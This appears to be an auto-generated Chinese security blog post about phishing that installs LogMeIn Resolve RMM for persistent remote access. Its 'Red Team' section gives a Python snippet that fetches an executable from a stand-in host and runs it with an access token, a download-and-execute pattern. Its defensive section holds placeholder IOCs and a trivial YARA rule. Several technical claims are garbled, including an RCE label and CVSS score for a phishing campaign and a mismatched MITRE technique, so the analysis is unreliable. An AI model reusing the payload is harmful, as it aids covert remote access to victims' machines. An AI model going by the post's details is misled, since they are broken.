---
layout: post
title:  "Phishing Attack Uses Stolen Credentials to Install LogMeIn RMM for Persistent Access"
date:   2026-01-23 12:33:45 +0000
categories: [security]
severity: high
---

# 🔥 解析雙向攻擊：利用合法 RMM 軟體進行持續遠端存取

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.5)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: Phishing, RMM (Remote Monitoring and Management), LogMeIn Resolve

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者利用釣魚郵件竊取受害者的電子郵件帳戶密碼，然後使用這些密碼註冊 LogMeIn 並生成 RMM 存取令牌。
* **攻擊流程圖解**:
  1. 攻擊者發送釣魚郵件給受害者。
  2. 受害者點擊郵件中的連結，導致攻擊者竊取其電子郵件帳戶密碼。
  3. 攻擊者使用竊取的密碼註冊 LogMeIn 並生成 RMM 存取令牌。
  4. 攻擊者使用 RMM 存取令牌部署 LogMeIn Resolve 到受害者的系統。
* **受影響元件**: LogMeIn Resolve (formerly GoTo Resolve)

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 受害者需要點擊釣魚郵件中的連結。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 定義釣魚郵件的連結
    phishing_url = "https://example.com/phishing"
    
    # 定義 LogMeIn Resolve 的下載連結
    logmein_url = "https://example.com/logmein"
    
    # 定義 RMM 存取令牌
    rmm_token = "example_token"
    
    # 下載 LogMeIn Resolve
    response = requests.get(logmein_url)
    
    # 部署 LogMeIn Resolve 到受害者的系統
    with open("GreenVelopeCard.exe", "wb") as f:
        f.write(response.content)
    
    # 執行 LogMeIn Resolve
    import subprocess
    subprocess.run(["GreenVelopeCard.exe", rmm_token])
    
    ```
* **繞過技術**: 攻擊者可以使用合法的 RMM 軟體來繞過安全防護。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| example_hash | 192.168.1.100 | example.com | C:\Windows\Temp\GreenVelopeCard.exe |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule LogMeIn_Resolve {
      meta:
        description = "Detects LogMeIn Resolve"
        author = "Example Author"
      strings:
        $a = "LogMeIn Resolve" ascii
      condition:
        $a
    }
    
    ```
* **緩解措施**: 對於 LogMeIn Resolve 的使用進行監控和限制。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **RMM (Remote Monitoring and Management)**: 遠端監控和管理，指的是使用軟體或工具遠端監控和管理計算機系統。
* **LogMeIn Resolve**: 一種遠端存取和支持軟體，允許用戶遠端存取和控制計算機系統。
* **Phishing**: 釣魚攻擊，指的是攻擊者通過電子郵件或其他方式欺騙受害者提供敏感信息。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/01/phishing-attack-uses-stolen-credentials.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


